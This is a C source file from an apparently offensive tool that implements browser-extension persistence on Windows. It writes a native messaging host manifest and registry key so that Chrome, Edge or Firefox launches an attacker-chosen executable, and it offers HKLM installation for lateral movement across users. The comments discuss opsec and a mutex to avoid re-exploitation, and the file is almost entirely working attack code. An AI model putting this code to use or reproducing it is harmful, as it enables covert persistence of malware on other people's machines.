#include "extendables.h"

/*
If a vulnerable browser extension exists on the system, this function can be used to execute code when the browser is launched/a specific action in the browser is performed.

Whenever specifying a path, always specify double backslashes \\.

Options are also present, if you are an admin, to add the functionality to all users on the system for lateral movement between logged on accounts (if they also have the extension installed).

You'll probably want to change the nativePath as by default it will drop the native.json in ProgramData, which isn't very opsec safe.

REQUIRED:
extensionId - identifier string for the extension, eg. aeblfdkhhhdcdjpifhhbdiojplfjncoa
extensionName - internal name of the extension, eg. com.1password.1password
targetPath - Path of exe or file with default app mapped, to run - MAKE SURE TO USE DOUBLE BACKSLASHES

OPTIONAL:
browser - browser to target: chrome, edge, firefox (all must be lowercase), default - chrome
nativePath - path for native.json to be saved to, default - C:\\ProgramData\\native.json - MAKE SURE TO USE DOUBLE BACKSLASHES
allUsers - install in HKLM or HKCU: user = HKCU, machine = HKLM (only works if admin), default - user
decription - Description of extension in native.json (doesn't really impact anything), default - 'This is an extension that extends browser functionality'
force - ignore any mutex to edit or replace old payload. For this, just type "force" after all of the other optional arguments"

*/
void extendablesPersist(char* extensionId, char* extensionName, char* targetPath, char* browser, char* nativePath, char* allUsers,  char* description, char* force, int verbose) {

    //Set up variables and default values
    HKEY localOrCurrent = HKEY_CURRENT_USER;
    char* regPath = (char*)"";
    OVERLAPPED ol = { 0 };
    HKEY default_key;


    printf("\n\n\n[*] Checking if mutex already exists for this extension\n");
    //See if mutex for current extension exists and stop execution if it does
    HANDLE mutexHnd = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, extensionId);
    if ((mutexHnd != NULL) && (strcmp(force, "force") != 0)) {
        printf("Mutex for %s already exists, so exploit has already been performed on this system!\n", extensionId);
        CloseHandle(mutexHnd);
        return;
    }
    else if ((mutexHnd != NULL) && (strcmp(force, "force") == 0)) {
        printf("Mutex for %s already exists, however you have forced execution!\n", extensionId);
    }
    else {
        printf("[*] No mutex, will continue!\n");
    }
    CloseHandle(mutexHnd);



    if (strcmp(extensionId, "") == 0) {
        printf("Please specify the extensionId of the extension to exploit\n");
        return;
    }

    if (strcmp(extensionName, "") == 0) {
        printf("Please specify the extensionName of the extension to exploit\n");
        return;
    }

    if (strcmp(targetPath, "") == 0) {
        printf("Please specify the path to your target which will be persisted\n");
        return;
    }

    //Set the correct registry location depending on browser specified
    if (strcmp(browser, "chrome") == 0) {
        regPath = (char*)"Software\\Google\\Chrome\\NativeMessagingHosts\\";
    }
    else if (strcmp(browser, "edge") == 0) {
        regPath = (char*)"Software\\Microsoft\\Edge\\NativeMessagingHosts\\";
    }
    else if (strcmp(browser, "firefox") == 0) {
        regPath = (char*)"Software\\Mozilla\\NativeMessagingHosts\\";
    }
    else {
        printf("Browser not recognised! Use - Chrome, Edge or Firefox\n");
        return;
    }
    //Set whether to use the NativeMessaging Application for all users or just the current user
    if (strcmp(allUsers, "user") == 0) {
        localOrCurrent = HKEY_CURRENT_USER;
        printf("[*] Installing for current user\n");
    }
    else if (strcmp(allUsers, "machine") == 0) {
        localOrCurrent = HKEY_LOCAL_MACHINE;
        printf("[*] Installing for all users\n");
    }
    else {
        printf("Please pick either user for HKCU or machine for HKLM (Default is user)\n");
        return;
    }

    //Create the full registry path with the extension
    char* fullReg = (char*)calloc(1, 255);
    memcpy_s(fullReg, 255, regPath, 255);
    strcat_s(fullReg, 255, extensionName);


    //Write the full content of the native.json file
    char* nativeContent = (char*)calloc(1, 1000);
    strcat_s(nativeContent, 1000, "{\n  \"name\": \"");
    if (strlen(nativeContent) > 50) {
        printf("Extension name is too long (>50 characters)\n");
        return;
    }
    strcat_s(nativeContent, 1000, extensionName);
    strcat_s(nativeContent, 1000, "\",\n  \"description\": \"");
    strcat_s(nativeContent, 1000, description);
    if (strlen(description) > 100) {
        printf("Extension name is too long (>100 characters)\n");
        return;
    }
    strcat_s(nativeContent, 1000, "\",\n  \"path\": \"");
    if (strlen(targetPath) > 255) {
        printf("Extension name is too long (>255 characters)\n");
        return;
    }
    strcat_s(nativeContent, 1000, targetPath);
    //Set protocol schema for specific browser in native.json
    if (strcmp(browser, "chrome") == 0) {
        strcat_s(nativeContent, 1000, "\",\n  \"type\": \"stdio\",\n  \"allowed_origins\": [\"chrome-extension://");
    }
    else if (strcmp(browser, "edge") == 0) {
        strcat_s(nativeContent, 1000, "\",\n  \"type\": \"stdio\",\n  \"allowed_origins\": [\"chrome-extension://");
    }
    else if (strcmp(browser, "firefox") == 0) {
        strcat_s(nativeContent, 1000, "\",\n  \"type\": \"stdio\",\n  \"allowed_extensions\": [\"");
    }
    if (strlen(extensionId) > 40) {
        printf("Extension name is too long (>40 characters)\n");
        return;
    }
    strcat_s(nativeContent, 1000, extensionId);
    if (strcmp(browser, "firefox") == 0) {
        strcat_s(nativeContent, 1000, "\"]\n}");
    }
    else {
        strcat_s(nativeContent, 1000, "/\"]\n}");
    }

    //Create and write the native.json where specified
    HANDLE handlef = CreateFileA(nativePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (handlef == 0) {
        printf("Error writing opening %s. Do you have permissions to access this location? Windows error code - %ld\n", nativePath, GetLastError());
        return;
    }
    WriteFile(handlef, nativeContent, strlen(nativeContent), NULL, &ol);
    free((PVOID)nativeContent);
    CloseHandle(handlef);

    printf("[*] native.json written to %s\n", nativePath);

    //Create the target registry key
    NTSTATUS status = RegCreateKeyExA(localOrCurrent, fullReg, 0, NULL, 0, KEY_SET_VALUE, NULL, &default_key, NULL);
    if (status != ERROR_SUCCESS)
    {
        printf("Error creating key!\n");
        if (strcmp(allUsers, "machine") == 0) {
            printf("Are you trying to install for all users as a non-admin?\n");
        }
        return;
    }

    printf("[*] Registry key created at %s\n", fullReg);
    free((PVOID)fullReg);

    //Set the value of the registry key to point at the native.json path
    status = RegSetValueExA(default_key, NULL, 0, REG_SZ, (const BYTE*)nativePath, strlen(nativePath) + 1);
    if (status != ERROR_SUCCESS)
    {
        printf("Error setting value!\n");
        return;
    }
    //Close the key
    RegCloseKey(default_key);

    printf("[*] Value added to registry key %s\n", nativePath);


    HANDLE newMutex = CreateMutexA(NULL, FALSE, extensionId);
    if (newMutex == 0) {
        printf("[-] Error creating mutex - %s\n", extensionId);
    }

    printf("[*] Successfully created mutex - %s\n", extensionId);

    //Select success message based on parameters
    if (strcmp(allUsers, "user") == 0) {
        printf("[*] Successfully persisted in the extension - %s for the current user on %s!\n", extensionName, browser);
    }
    else if (strcmp(allUsers, "machine") == 0) {
        printf("[*] Successfully persisted in the extension - %s for all users on %s!\n", extensionName, browser);
    }


    return;
}